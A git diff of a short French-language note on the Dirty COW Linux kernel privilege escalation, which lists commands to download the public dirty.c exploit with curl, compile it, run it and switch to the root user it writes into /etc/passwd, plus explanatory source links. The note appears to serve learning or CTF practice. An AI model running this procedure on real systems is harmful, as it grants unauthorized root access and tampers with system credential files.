@@ -13,11 +13,12 @@ $> uname -r
 ```
 curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
 gcc -pthread dirty.c -o dirty -lcrypt
-./dirty
+./dirty lol
+su firefart
 ```
 - L'exploit arrive à ecrire un nouvel utilisateur root dans `/etc/passwd`
 
 ## Source
 - [Explication](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html#what-is-cow)
-- [Excplication Youtube](https://www.youtube.com/watch?v=kEsshExn7aE)
+- [Explication Youtube](https://www.youtube.com/watch?v=kEsshExn7aE)
 - [Script](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
